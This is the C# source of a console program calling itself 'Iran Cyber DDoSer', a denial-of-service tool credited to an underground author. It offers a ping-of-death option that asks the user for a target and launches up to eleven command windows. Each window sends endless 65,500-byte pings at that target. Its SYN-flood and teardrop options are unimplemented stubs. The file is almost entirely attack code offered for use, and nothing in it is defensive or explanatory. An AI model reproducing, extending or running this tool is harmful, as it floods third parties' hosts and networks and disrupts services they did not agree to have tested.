using System;

using System.Diagnostics;

namespace ICDDoSer
{
    class Program
    {
        static void Main(string[] args)
        {
            int sLt;
            Console.WriteLine("----------------------------------------------------------------------");
            Console.WriteLine("#,--. ,-----.       ,------.  ,------.          ,---.                #");
            Console.WriteLine(@"#|  |'  .--./,-----.|  .-.  \ |  .-.  \  ,---. '   .-'  ,---. ,--.--.#");
            Console.WriteLine(@"#|  ||  |    '-----'|  |  \  :|  |  \  :| .-. |`.  `-. | .-. :|  .--'#");
            Console.WriteLine(@"#|  |'  '--'\       |  '--'  /|  '--'  /' '-' '.-'    |\   --.|  |   #");
            Console.WriteLine(@"#`--' `-----'       `-------' `-------'  `---' `-----'  `----'`--'   #");
            Console.WriteLine("##################### Iran Cyber DDoSer version 1.0 ##################");
            Console.WriteLine("###########################   Coded By Unkn0wn #######################");
            Console.WriteLine("######################## [unkn0wn@danwin1210.me] #####################");
            Console.WriteLine("####################Underground Researcher @ 2009-2018 ###############");
            Console.WriteLine("############ www.iran-cyber.net All illegal Right Reserved ###########");
            Console.WriteLine("----------------------------------------------------------------------");

            Console.WriteLine("[1]Ping Of Death");
            Console.WriteLine("[2]Syn Floode (Soon..)");
            Console.WriteLine("[3]TearDrop Attack (Soon..)");
            Console.Write("Select Your Method:");
            sLt = Convert.ToInt32(Console.ReadLine());

           switch (sLt)
           {
               case 1:
                   string PingOfDeath;
                   int numCmd;
                   Console.WriteLine("Target:");
                   PingOfDeath = Console.ReadLine();
                   Console.WriteLine("Put Your CMD [1-10]:");
                   numCmd = Convert.ToInt32(Console.ReadLine());

                   for (int i = 0; i <= numCmd; i++ )
                   {
                       

                       string strCmd;
                       string strW = "-w 1000000";
                       string strN = "-n 1000000";
                       strCmd = string.Format("/C ping -t -a -l 65500 {0} {1} {2}", PingOfDeath,strW,strN);
                      
                       System.Diagnostics.Process.Start("CMD.exe",strCmd);
                          
                   }
                   break;

               case 2:
                   {
                       Console.WriteLine("This option will be completed shortly...!");
                       Console.ReadLine();
                   }
                   break;

               case 3:
                   {
                       Console.WriteLine("This option will be completed shortly...!");
                       Console.ReadLine();
                   }
                   break;
        }
        }
    }
}
